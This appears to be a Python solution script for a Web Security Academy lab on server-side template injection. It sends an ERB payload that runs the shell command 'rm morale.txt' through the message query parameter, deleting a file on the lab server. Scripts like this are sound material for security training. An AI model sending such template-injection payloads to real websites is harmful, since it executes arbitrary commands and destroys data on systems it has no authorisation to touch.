#########################################################################
#
# Lab: Basic server-side template injection
#
# Hack Steps:
#      1. Fetch the main page with the injected payload in the message
#         query parameter
#      2. Observe that the morale.txt file is successfully deleted
#
#########################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0aa1001703e8b5e5814b6167009100e1.web-security-academy.net"

def main():
    print("Injection parameter: " + Fore.YELLOW + "message")
    print(Fore.WHITE + "❯❯ Fetching the main page with the injected payload.. ", end="", flush=True)
    
    payload = """<% system("rm morale.txt") %>"""
    
    try:
        requests.get(f"{LAB_URL}/?message={payload}")

    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The morale.txt file is successfully deleted")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()